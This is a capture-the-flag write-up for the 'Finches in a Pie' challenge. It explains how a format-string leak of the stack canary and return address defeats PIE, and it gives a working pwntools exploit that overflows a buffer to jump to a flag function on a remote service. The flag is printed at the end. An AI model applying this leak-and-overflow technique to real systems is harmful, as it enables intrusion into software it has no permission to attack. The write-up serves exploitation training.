# Finches in a Pie

> There's a service at 88.198.219.20:43174, exploit it to get the flag.

## Description

This problem is extremely similar to [Finches in a Stack](FinchesStack.md), except that PIE is enabled. 

## Solution

The exploit is the same, except that we also leak the return address (to `main`), and deduce from it and the constant offset the address of `flag`. 

```python
from pwn import *

sh = remote('88.198.219.20', 52692)

print(sh.recvuntil("name?").decode())

# Leak canary and ret address
offset_canary = 11
offset_ret = 15
payload = "%{}$p %{}$p".format(offset_canary, offset_ret)
sh.sendline(payload)

print(sh.recvuntil("you, ").decode(), end="")
answer = sh.recvuntil("!").decode()
print(answer)
answer = answer.split("!")[0]
canary = int(answer.split(" ")[0], 16)
ret_addr = int(answer.split(" ")[1], 16)

# Overflow
offset_canary = 4*6+1
offset_ret = 3*4
offset_flag = 0x56556209 - 0x565563d9
print(sh.recvuntil("cake?").decode())
payload = b" "*offset_canary + p32(canary) + b" "*offset_ret + p32(ret_addr + offset_flag) + "".join([str(i)*4 for i in range(9)]).encode()

sh.sendline(payload)

sh.interactive()
```

Flag: `ractf{B4k1ng_4_p1E!}`